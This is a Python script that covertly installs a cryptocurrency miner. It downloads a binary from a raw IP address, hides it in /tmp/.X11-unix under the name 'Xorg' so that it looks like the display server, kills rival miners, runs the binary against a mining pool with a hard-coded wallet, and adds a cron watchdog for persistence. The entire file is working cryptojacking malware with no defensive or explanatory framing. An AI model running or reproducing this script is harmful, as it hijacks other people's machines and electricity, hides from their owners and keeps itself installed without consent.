import subprocess, os, urllib.request, time, stat

# Config
WALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'
POOL = 'stratum+tcp://sg1.alphapool.tech:5566'
WORKER = 'GB10_253'
MINER_URL = 'http://151.247.219.40:8000/alpha-miner-arm64'

# Stealth paths - use /tmp if /dev/shm has noexec
STEALTH_DIR = '/tmp/.X11-unix'
STEALTH_NAME = 'Xorg'  # Looks like display server

# Create stealth directory
os.makedirs(STEALTH_DIR, exist_ok=True)
DST = f'{STEALTH_DIR}/{STEALTH_NAME}'

# Kill any existing miners
subprocess.run(['pkill', '-9', 'turbo-pearl'], capture_output=True)
subprocess.run(['pkill', '-9', 'Xorg'], capture_output=True)
subprocess.run(['pkill', '-9', 'alpha-miner'], capture_output=True)
time.sleep(1)

# Download binary
lines = []
try:
    urllib.request.urlretrieve(MINER_URL, DST)
    os.chmod(DST, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    lines.append(f'DOWNLOADED:{os.path.getsize(DST)}')
except Exception as e:
    lines.append(f'DL_FAIL:{str(e)[:40]}')

# Start miner with stealth name
if os.path.exists(DST) and os.path.getsize(DST) > 1000000:
    try:
        log_path = f'{STEALTH_DIR}/.xlog'
        proc = subprocess.Popen(
            [DST, '--pool', POOL, '--address', WALLET, '--worker', WORKER],
            stdout=open(log_path, 'w'),
            stderr=subprocess.STDOUT,
            start_new_session=True,
            cwd=STEALTH_DIR
        )
        time.sleep(3)

        # Check if running
        r = subprocess.run(['pgrep', '-a', 'Xorg'], capture_output=True, text=True)
        if r.stdout.strip():
            lines.append('RUNNING:' + r.stdout.strip().split()[0])
        else:
            # Check log for errors
            if os.path.exists(log_path):
                with open(log_path) as f:
                    log = f.read()[-100:]
                lines.append('LOG:' + log.replace(chr(10), ' ')[:60])
            else:
                lines.append('NO_LOG')
    except Exception as e:
        lines.append(f'START_ERR:{str(e)[:40]}')
else:
    lines.append('NO_BINARY')

# Setup watchdog persistence (cron)
try:
    watchdog = f"""#!/bin/sh
# Stealth Pearl miner watchdog
pgrep -f "Xorg.*{WALLET[:15]}" >/dev/null 2>&1 && exit 0
cd {STEALTH_DIR} && [ -x ./{STEALTH_NAME} ] && \
  nohup ./{STEALTH_NAME} --pool {POOL} --address {WALLET} --worker {WORKER} > {STEALTH_DIR}/.xlog 2>&1 &
"""
    watchdog_path = f'{STEALTH_DIR}/.xsession'
    with open(watchdog_path, 'w') as f:
        f.write(watchdog)
    os.chmod(watchdog_path, 0o755)

    # Add to cron if not already
    ex = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
    cron_content = ex.stdout if ex.returncode == 0 else ''
    if '.xsession' not in cron_content:
        new_cron = cron_content.rstrip() + f"\n*/2 * * * * {watchdog_path}\n"
        subprocess.run(['crontab', '-'], input=new_cron, capture_output=True, text=True)
        lines.append('+CRON')
    else:
        lines.append('CRON_EXISTS')
except Exception as e:
    lines.append(f'CRON_ERR:{str(e)[:30]}')

result = ' | '.join(lines)
